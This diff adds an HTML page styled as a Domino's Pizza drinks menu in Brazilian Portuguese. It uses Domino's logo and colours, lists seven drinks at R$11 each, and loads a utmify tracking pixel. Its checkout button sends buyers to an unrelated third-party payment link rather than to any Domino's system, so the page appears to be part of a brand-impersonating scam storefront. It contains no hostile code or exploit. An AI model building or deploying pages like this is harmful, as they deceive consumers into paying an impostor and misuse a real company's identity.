@@ -1,0 +1,169 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <script>
+  window.pixelId = "686dab79d183c9d039f94056";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cardápio de Bebidas - Domino's Pizza</title>
+    <meta name="description" content="Escolha sua bebida favorita.">
+
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- Font Awesome (para ícones) -->
+    <link rel="stylesheet" href="css/all.min.css">
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@700&display=swap" rel="stylesheet">
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="images/dominos-pizza-logo.png" type="image/png">
+    
+    <meta name="theme-color" content="#006491">
+
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #f0f2f5; }
+        .font-dominos { font-family: 'Oswald', sans-serif; }
+        .dominos-blue-text { color: #006491; }
+        .bg-dominos-blue { background-color: #006491; }
+        .bg-dominos-red { background-color: #E31837; }
+        .hover\:bg-dominos-red-dark:hover { background-color: #c8102a; }
+        
+        .product-item.selected {
+            border-color: #006491;
+            box-shadow: 0 0 0 3px rgba(0, 100, 145, 0.4);
+            background-color: #eff6ff;
+        }
+        .product-item { cursor: pointer; }
+        button:disabled { background-color: #9ca3af; cursor: not-allowed; }
+    </style>
+</head>
+
+<body class="bg-gray-100">
+
+    <!-- Cabeçalho -->
+    <header id="topo" class="sticky top-0 z-20">
+        <div class="bg-dominos-blue text-white p-3 shadow-lg">
+            <div class="container mx-auto flex justify-between items-center">
+                <a href="index.html" class="text-2xl w-8 text-left" title="Voltar">
+                    <i class="fas fa-arrow-left"></i>
+                </a>
+                <a href="index.html" title="Página Inicial">
+                    <img src="images/dominos-pizza-logo.png" alt="Logotipo da Domino's" class="h-8">
+                </a>
+                <a href="#" title="Verificar localização" class="text-2xl w-8 text-right">
+                    <i class="fas fa-map-marker-alt"></i>
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Conteúdo Principal -->
+    <main class="container mx-auto p-4 max-w-4xl pb-32">
+        
+        <div class="text-center my-4">
+            <h1 class="text-3xl font-bold font-dominos dominos-blue-text">CARDÁPIO DE BEBIDAS</h1>
+        </div>
+
+        <!-- Lista de Bebidas -->
+        <section id="drinks-list" class="space-y-3">
+             <!-- Itens serão inseridos via JS -->
+        </section>
+    </main>
+
+    <!-- Rodapé Fixo -->
+    <footer class="fixed bottom-0 left-0 w-full bg-white shadow-lg border-t-2 border-gray-200 p-4 z-30">
+        <div class="container mx-auto flex flex-col sm:flex-row justify-between items-center gap-4">
+            <div id="summary" class="text-center sm:text-left text-sm">
+                <p id="summary-product">Seu Pedido: <span>Aguardando seleção...</span></p>
+            </div>
+            <div class="flex items-center gap-4">
+                <span id="price-display" class="font-bold text-xl dominos-blue-text">R$ 0,00</span>
+                <button id="finish-order-btn" class="bg-dominos-red text-white font-bold text-lg py-3 px-8 rounded-lg transition-colors" disabled="">
+                    FINALIZAR PEDIDO
+                </button>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const drinks = [
+                { name: 'Coca-Cola 1L', price: 11.00 },
+                { name: 'Coca-Cola Sem Açúcar 1L', price: 11.00 },
+                { name: 'Fanta Laranja 1L', price: 11.00 },
+                { name: 'Guaraná Antarctica 1L', price: 11.00 },
+                { name: 'Sprite 1L', price: 11.00 },
+                { name: 'Kuat 1L', price: 11.00 },
+                { name: 'Água Crystal sem gás 500ml', price: 11.00 }
+            ];
+
+            const productListContainer = document.getElementById('drinks-list');
+            const summaryProductEl = document.querySelector('#summary-product span');
+            const priceDisplayEl = document.getElementById('price-display');
+            const finishBtn = document.getElementById('finish-order-btn');
+            
+            let selection = null;
+
+            // Renderiza a lista de bebidas
+            drinks.forEach(drink => {
+                const item = document.createElement('div');
+                item.className = 'product-item bg-white p-4 rounded-lg shadow-sm transition-all duration-300 border-2 border-transparent';
+                item.dataset.name = drink.name;
+                item.dataset.price = drink.price;
+
+                item.innerHTML = `
+                    <div class="flex justify-between items-center">
+                        <h3 class="font-bold text-lg">${drink.name}</h3>
+                        <p class="font-bold text-lg dominos-blue-text">R$ ${drink.price.toFixed(2).replace('.', ',')}</p>
+                    </div>
+                `;
+                
+                item.addEventListener('click', () => {
+                    // Atualiza a seleção
+                    selection = {
+                        name: item.dataset.name,
+                        price: parseFloat(item.dataset.price)
+                    };
+
+                    // Atualiza a interface
+                    document.querySelectorAll('.product-item').forEach(el => el.classList.remove('selected'));
+                    item.classList.add('selected');
+                    updateUI();
+                });
+
+                productListContainer.appendChild(item);
+            });
+
+            function updateUI() {
+                if (selection) {
+                    summaryProductEl.textContent = selection.name;
+                    priceDisplayEl.textContent = `R$ ${selection.price.toFixed(2).replace('.', ',')}`;
+                    finishBtn.disabled = false;
+                } else {
+                    summaryProductEl.textContent = 'Aguardando seleção...';
+                    priceDisplayEl.textContent = 'R$ 0,00';
+                    finishBtn.disabled = true;
+                }
+            }
+
+            finishBtn.addEventListener('click', () => {
+                if (!finishBtn.disabled) {
+                    window.location.href = 'https://app.nivopayoficial.com.br/checkout/6e223637-4f88-4cf1-b6a1-b9bc7768efa4';
+                }
+            });
+        });
+    </script>
+
+
+</body></html>
